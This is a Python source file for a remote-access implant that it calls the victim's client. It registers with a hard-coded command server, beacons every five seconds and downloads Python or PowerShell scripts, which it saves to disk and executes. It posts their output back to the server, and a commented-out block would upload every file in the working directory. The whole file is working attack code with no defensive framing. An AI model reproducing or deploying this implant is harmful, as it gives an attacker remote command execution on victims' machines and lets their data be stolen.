import os
import requests
import time
import random
import string
import base64
import platform
import pdb
import json
import subprocess
import sys
import traceback
from mss import mss
from os.path import isfile, join


def staging(identifier):
	url = 'http://192.168.19.136:8080/stage_0'
	cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
	os_info = {'platform': platform.system(), 'version': platform.release()}
	r = requests.post(url = url,cookies = cookies, data = os_info)
	return r

## Send out beacons for 60secs at 5secs interval
def beacon(identifier):
	start_time = time.time()
	url = 'http://192.168.19.136:8080'
	while True:

		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
		r = requests.get(url=url,cookies = cookies)


		if r.text != 'Nothing Fishy going on here :)':
			## Didin't get default reply, so some command has been sent?
			handle_commands(r,identifier)

		time.sleep(5)

def handle_commands(response, identifier):
	try:
		## Recieved the commands in a dictionary text {'cmd': 'screenshot', 'script': 'script text'}. Converting to dictionary
		res = json.loads(response.text)


		language = res['language']
		## Save the script to file
		if platform.system() == 'Linux':
			dump_dir = '/tmp'
		else:
			dump_dir = os.getcwd()

		if language == 'python':
			save_path = join(dump_dir,res['cmd']+".py")
		else:
			## Powershell
			save_path = join(dump_dir,res['cmd']+".ps1")

		f = open(save_path, "w+")
		f.write(res['script'])
		f.close()
		
		if os.path.isfile(save_path):

			if language == 'python':
				## The dump directory is to be added to os path as python looks there for requires in case not in current directory
				sys.path.append(os.path.abspath(dump_dir))
				file =  __import__(res['cmd'])

				command_output = file.execute_command()
			else:
				result = subprocess.run([r"powershell.exe", save_path], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
				command_output = result.stdout.decode('utf-8')

		if command_output:
			# Sending out data
			url = 'http://192.168.19.136:8080/'+res['cmd']+'/output/'+res['task_id']
			cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
			# custom_headers = {'filename':f}

			r = requests.post(url = url,cookies = cookies, data = command_output)
		else:
			## Some error happened while exexuting task, send some othe response code?
			pass
	except:
		url = 'http://192.168.19.136:8080/'
		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
		# custom_headers = {'filename':f}

		r = requests.post(url = url,cookies = cookies, data = traceback.format_exc())


		

	# for f in os.listdir('.'):
	# 	if isfile(join('.', f)):
	# 		print(f)
	# 		## wb enables to read bianry
	# 		content = open(f,"rb").read()

	# 		## Sending out data
	# 		url = 'http://0.0.0.0:8080'
	# 		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
	# 		custom_headers = {'filename':f}
	# 		r = requests.post(url = url,cookies = cookies, headers = custom_headers, data = content)

def main():
	## Will identify the victim
	identifier = ''.join(random.choices(string.ascii_uppercase +string.digits, k = 10))
	response = staging(identifier)
	
	if response.status_code == 200:
		beacon(identifier)

if __name__=="__main__":
	main()